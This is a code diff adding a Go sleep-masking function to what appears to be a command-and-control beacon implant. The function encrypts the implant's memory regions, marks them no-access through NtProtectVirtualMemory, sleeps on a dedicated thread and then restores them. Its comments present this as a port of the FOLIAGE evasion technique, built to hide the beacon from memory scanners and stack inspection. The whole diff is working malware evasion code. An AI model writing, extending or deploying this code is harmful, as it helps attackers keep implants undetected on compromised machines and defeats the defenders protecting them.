@@ -175,3 +175,55 @@ func sleepMaskEkko(durationMs uint32) {
 	}
 	maskRegionsMu.Unlock()
 }
+
+// sleepMaskFoliage is the Go equivalent of the FOLIAGE APC-based technique.
+// A dedicated OS-thread goroutine performs encrypt→sleep→decrypt while the
+// calling goroutine parks on a channel. This keeps the main beacon goroutine's
+// call-stack clean during the sleep and moves VirtualProtect calls to a
+// separate thread — the same isolation property that FOLIAGE achieves with
+// NtCreateThreadEx + NtQueueApcThread in C.
+func sleepMaskFoliage(durationMs uint32) {
+	done := make(chan struct{})
+	go func() {
+		// Encrypt registered regions
+		maskRegionsMu.Lock()
+		for _, r := range maskRegions {
+			xorMaskRegion(r.base, r.size)
+		}
+		// Set PAGE_NOACCESS on all regions
+		for _, r := range maskRegions {
+			a, sz := r.base, r.size
+			var old uint32
+			procNtProtectVirtualMemory.Call(
+				uintptr(windows.CurrentProcess()),
+				uintptr(unsafe.Pointer(&a)),
+				uintptr(unsafe.Pointer(&sz)),
+				uintptr(windows.PAGE_NOACCESS),
+				uintptr(unsafe.Pointer(&old)),
+			)
+		}
+		maskRegionsMu.Unlock()
+
+		// Sleep on this dedicated thread
+		delay := -int64(durationMs) * 10000
+		procNtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))
+
+		// Restore and decrypt
+		maskRegionsMu.Lock()
+		for _, r := range maskRegions {
+			a, sz := r.base, r.size
+			var old uint32
+			procNtProtectVirtualMemory.Call(
+				uintptr(windows.CurrentProcess()),
+				uintptr(unsafe.Pointer(&a)),
+				uintptr(unsafe.Pointer(&sz)),
+				uintptr(windows.PAGE_EXECUTE_READ),
+				uintptr(unsafe.Pointer(&old)),
+			)
+			xorMaskRegion(r.base, r.size)
+		}
+		maskRegionsMu.Unlock()
+		close(done)
+	}()
+	<-done
+}
